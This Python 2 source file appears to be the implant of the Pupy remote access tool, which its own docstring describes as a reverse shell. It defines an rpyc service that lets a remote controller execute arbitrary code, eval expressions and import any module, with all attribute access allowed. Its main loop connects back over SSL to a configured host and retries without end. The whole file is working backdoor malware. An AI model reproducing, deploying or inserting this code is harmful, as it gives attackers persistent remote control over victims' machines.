#!/usr/bin/env python
# -*- coding: UTF8 -*-
import site
import sys
import time
import rpyc
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute, is_py3k
import threading
import weakref
import traceback
import os
import subprocess
import threading
import multiprocessing
import logging
import StringIO
import json
import urllib2
import urllib
import platform
import re
import ssl
import random


class ReverseSlaveService(Service):
	""" Pupy reverse shell rpyc service """
	__slots__=["exposed_namespace"]
	def on_connect(self):
		self.exposed_namespace = {}
		self._conn._config.update(dict(
			allow_all_attrs = True,
			allow_public_attrs = True,
			allow_pickle = True,
			allow_getattr = True,
			allow_setattr = True,
			allow_delattr = True,
			import_custom_exceptions = False,
			propagate_SystemExit_locally=False,
			propagate_KeyboardInterrupt_locally=True,
			instantiate_custom_exceptions = True,
			instantiate_oldstyle_exceptions = True,
		))
		# shortcuts
		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))

	def exposed_exit(self):
		raise KeyboardInterrupt
	def exposed_execute(self, text):
		"""execute arbitrary code (using ``exec``)"""
		execute(text, self.exposed_namespace)
	def exposed_eval(self, text):
		"""evaluate arbitrary code (using ``eval``)"""
		return eval(text, self.exposed_namespace)
	def exposed_getmodule(self, name):
		"""imports an arbitrary module"""
		return __import__(name, None, None, "*")
	def exposed_getconn(self):
		"""returns the local connection instance to the other side"""
		return self._conn


def get_next_wait(attempt):
	return 0.5
	if attempt<60:
		return 0.5
	else:
		return random.randint(15,30)

def main():
	HOST="127.0.0.1:443"
	if "win" in platform.system().lower():
		try:
			import pupy
			HOST=pupy.get_connect_back_host()
		except ImportError:
			print "Warning : ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL"
			if len(sys.argv)!=2:
				exit("usage: %s host:port"%sys.argv[0])
			HOST=sys.argv[1]
	attempt=0
	while True:
		try:
			rhost,rport=None,None
			tab=HOST.rsplit(":",1)
			rhost=tab[0]
			if len(tab)==2:
				rport=int(tab[1])
			else:
				rport=443

			print "connecting to %s:%s"%(rhost,rport)
			conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)
			while True:
				attempt=0
				conn.serve()
		except KeyboardInterrupt:
			print "keyboard interrupt received !"
			break
		except Exception as e:
			time.sleep(get_next_wait(attempt))
			attempt+=1

if __name__=="__main__":
	main()

